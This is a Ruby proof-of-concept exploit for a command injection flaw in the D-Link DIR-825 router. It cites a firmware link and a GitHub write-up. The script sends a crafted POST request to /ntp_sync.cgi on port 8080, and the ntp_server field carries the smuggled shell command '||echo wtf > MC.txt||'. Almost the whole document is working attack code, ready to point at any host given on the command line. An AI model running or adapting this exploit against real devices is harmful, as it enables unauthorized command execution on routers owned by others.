#!/usr/bin/env ruby
# http://legacyfiles.us.dlink.com/DIR-825/REVB/FIRMWARE/DIR-825_REVB_FIRMWARE_2.03.ZIP
# https://raw.githubusercontent.com/WhooAmii/iot/master/DIR-825/command%20injection.md

require 'rex'

host = ARGV[0]

def usage
 puts "[*] D-Link DIR-825 Command Injection"
 puts "[*] #{$0} <host>"
 exit
end

usage if ARGV.size < 1

begin

sock = Rex::Proto::Http::Client.new(host, port = "8080", context = {}, ssl = false)


data = "ntp_server=||echo wtf > MC.txt||"

req = sock.request_cgi(
	{
		'uri'   => "/ntp_sync.cgi",
		'version' => '1.1',
                'ctype' => 'text/plain',
		'method' => 'POST',
                'data' => data,
                'headers' => {
                   'Accept' => '*/*',
                   'Origin' => 'null',
                   'Accept-Encoding' => 'gzip, deflate',
                   'Accept-Language' => 'en-US,en;q=0.9',
                   'Connection' => 'keep-alive',
                }
	})

	sock.send_request(req)
	data = sock.read_response()
rescue => e
puts "[!] #{e.to_s}"
end
